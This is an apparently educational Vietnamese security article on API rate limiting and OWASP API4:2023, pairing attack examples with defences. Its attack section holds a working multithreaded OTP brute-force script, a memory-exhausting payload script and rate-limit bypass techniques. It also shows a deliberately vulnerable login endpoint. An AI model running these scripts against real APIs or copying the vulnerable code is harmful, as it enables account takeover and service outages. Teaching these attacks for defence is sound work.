# API Rate Limiting & Resource Abuse

> **OWASP**: API Security (API4:2023) | **CWE**: CWE-770 | **Nguồn**: OWASP API Security Top 10, PortSwigger

## 🧱 Kiến thức Nền tảng

**Rate limiting** là cơ chế kiểm soát số lượng request mà một client có thể gửi đến API trong một khoảng thời gian nhất định. Đây là tuyến phòng thủ quan trọng chống lại brute force, DoS, credential stuffing, và resource exhaustion.

Các thuật toán rate limiting phổ biến:
- **Fixed Window**: đếm request trong khung thời gian cố định (ví dụ: 100 req/phút)
- **Sliding Window**: cửa sổ thời gian di chuyển liên tục, chính xác hơn
- **Token Bucket**: mỗi client có "bucket" chứa token, mỗi request tiêu thụ token
- **Leaky Bucket**: request được xử lý với tốc độ cố định, vượt quá thì drop

Rate limit thường được triển khai tại nhiều tầng: API Gateway, WAF, application middleware, hoặc database level.

```python
# Simple token bucket rate limiter — normal operation
import time

class TokenBucket:
    def __init__(self, capacity, refill_rate):
        self.capacity = capacity          # Maximum tokens in bucket
        self.tokens = capacity            # Current available tokens
        self.refill_rate = refill_rate    # Tokens added per second
        self.last_refill = time.time()

    def allow_request(self):
        """Check if a request should be allowed"""
        self._refill()
        if self.tokens >= 1:
            self.tokens -= 1              # Consume one token
            return True                   # Request allowed
        return False                      # Rate limited — reject request

    def _refill(self):
        now = time.time()
        elapsed = now - self.last_refill
        self.tokens = min(self.capacity, self.tokens + elapsed * self.refill_rate)
        self.last_refill = now

# Usage: 10 requests per second
limiter = TokenBucket(capacity=10, refill_rate=10)
```

## 🔍 Mô tả lỗ hổng

**API4:2023 — Unrestricted Resource Consumption** xảy ra khi API không giới hạn đúng cách tài nguyên mà client có thể tiêu thụ. Không chỉ là thiếu rate limit đơn giản, mà còn bao gồm:

- **Thiếu rate limit hoàn toàn** trên endpoint nhạy cảm (login, OTP, password reset)
- **Pagination abuse**: yêu cầu `?page_size=999999` để dump toàn bộ database
- **Large payload DoS**: gửi request body cực lớn gây exhaustion bộ nhớ
- **Regex DoS (ReDoS)**: input khiến regex xử lý exponential time
- **Resource-intensive operations**: yêu cầu export CSV, generate report không giới hạn

Hậu quả: brute force thành công, chiếm tài khoản, denial of service, chi phí cloud tăng đột biến (bill shock).

## ⚔️ Cơ chế tấn công

**1. Brute force OTP — No rate limit on verification:**

```python
# Attacker brute-forces 6-digit OTP — only 1 million possibilities
import requests
import concurrent.futures

TARGET = "https://api.target.com/verify-otp"
HEADERS = {"Authorization": "Bearer stolen_token"}

def try_otp(otp):
    """Try a single OTP code"""
    response = requests.post(TARGET, json={
        "otp": f"{otp:06d}"  # Format as 6-digit string: 000000 to 999999
    }, headers=HEADERS)
    if response.status_code == 200:
        return otp, response.json()
    return None

# Parallel brute force — 50 threads, ~1M attempts in minutes
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(try_otp, i): i for i in range(1000000)}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            print(f"[SUCCESS] OTP found: {result[0]:06d}")
            break
```

**2. Pagination abuse — Dump entire database:**

```http
# Normal request — returns 20 records
GET /api/users?page=1&page_size=20 HTTP/1.1

# Attacker's request — requests ALL records at once
GET /api/users?page=1&page_size=9999999 HTTP/1.1

# Server loads millions of records into memory → OOM crash
# Or: attacker receives full user dump including sensitive fields
```

**3. Large payload DoS — Exhausting server memory:**

```python
# Send extremely large JSON payload to exhaust server memory
import requests

# 100MB JSON payload — server tries to parse entire body into memory
huge_payload = {"data": "A" * (100 * 1024 * 1024)}

response = requests.post(
    "https://api.target.com/import",
    json=huge_payload,
    headers={"Content-Type": "application/json"}
)
# Server: json.loads() on 100MB string → memory spike → crash
```

**4. Rate limit bypass techniques:**

```http
# Bypass IP-based rate limiting by rotating identifiers

# Technique 1: IP rotation via headers
GET /api/login HTTP/1.1
X-Forwarded-For: 1.2.3.4          # Proxy trusts this header for IP identification
X-Real-IP: 5.6.7.8                # Different "IP" for each request

# Technique 2: Endpoint variation (same handler, different path)
POST /api/v1/login HTTP/1.1       # Rate limited
POST /API/V1/LOGIN HTTP/1.1       # Same endpoint, different case — may bypass
POST /api/v1/login/ HTTP/1.1      # Trailing slash — different rate limit bucket
POST /api/v1/login?dummy=1 HTTP/1.1  # Query param — different cache key

# Technique 3: Parameter pollution
POST /api/login HTTP/1.1
{"username":"admin","password":"test1","password":"test2"}
# Some parsers process both values, doubling attempts per request
```

## 🛡️ Biện pháp phòng thủ

1. **Rate limit theo nhiều dimension** — IP + User ID + Endpoint:

```python
# Multi-dimensional rate limiting with Redis
import redis
from functools import wraps
from flask import request, jsonify

r = redis.Redis()

def rate_limit(max_requests, window_seconds, key_func):
    """Rate limit decorator with configurable key function"""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            # Build composite rate limit key
            key = f"ratelimit:{request.endpoint}:{key_func()}"
            current = r.incr(key)
            if current == 1:
                r.expire(key, window_seconds)
            if current > max_requests:
                return jsonify({"error": "Rate limit exceeded"}), 429
            return f(*args, **kwargs)
        return wrapper
    return decorator

# Apply: 5 OTP attempts per 15 minutes, keyed by user ID
@app.route('/verify-otp', methods=['POST'])
@rate_limit(max_requests=5, window_seconds=900,
            key_func=lambda: request.json.get('user_id', request.remote_addr))
def verify_otp():
    pass
```

2. **Giới hạn pagination và payload size:**

```python
# Enforce maximum page size and request body limits
@app.route('/api/users')
def list_users():
    page = max(1, request.args.get('page', 1, type=int))
    page_size = request.args.get('page_size', 20, type=int)
    page_size = min(page_size, 100)  # CAP at 100 — never allow more

    users = db.users.find().skip((page - 1) * page_size).limit(page_size)
    return jsonify(users)

# Limit request body size at framework level
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024  # 1MB max body size
```

3. **Trả về rate limit headers** để client biết giới hạn:

```http
HTTP/1.1 200 OK
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 42
X-RateLimit-Reset: 1625097600
Retry-After: 30
```

4. **Normalize URL/method** trước khi áp dụng rate limit — tránh bypass bằng case variation.

5. **Không tin tưởng `X-Forwarded-For`** từ client — chỉ dùng IP từ trusted proxy.

## 💻 Code Example

```python
# === VULNERABLE: No rate limit, no pagination cap, no body limit ===
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()  # No body size limit!
    user = db.users.find_one({"email": data['email']})
    if user and check_password(data['password'], user['password']):
        return jsonify({"token": generate_token(user)})
    return jsonify({"error": "Invalid credentials"}), 401
    # No rate limit — attacker can try millions of passwords

# === SECURE: Rate limited, body limited, account lockout ===
@app.route('/api/login', methods=['POST'])
@rate_limit(max_requests=5, window_seconds=300,
            key_func=lambda: request.json.get('email', ''))
def login_secure():
    data = request.get_json(force=False, silent=True)
    if not data or len(request.data) > 1024:  # Reject oversized bodies
        return jsonify({"error": "Invalid request"}), 400

    email = data.get('email', '')
    lockout_key = f"lockout:{email}"

    # Check if account is locked
    if r.get(lockout_key):
        return jsonify({"error": "Account temporarily locked"}), 423

    user = db.users.find_one({"email": email})
    if user and check_password(data['password'], user['password']):
        r.delete(f"failed:{email}")  # Reset failed counter on success
        return jsonify({"token": generate_token(user)})

    # Track failed attempts — lock after 10 failures
    failures = r.incr(f"failed:{email}")
    r.expire(f"failed:{email}", 3600)
    if failures >= 10:
        r.setex(lockout_key, 1800, "locked")  # Lock for 30 minutes
    return jsonify({"error": "Invalid credentials"}), 401
```

## 📚 Nguồn tham khảo
- OWASP: https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/
- PortSwigger: https://portswigger.net/web-security/authentication/password-based
- CWE: https://cwe.mitre.org/data/definitions/770.html
- IETF Rate Limiting: https://datatracker.ietf.org/doc/draft-ietf-httpapi-ratelimit-headers/
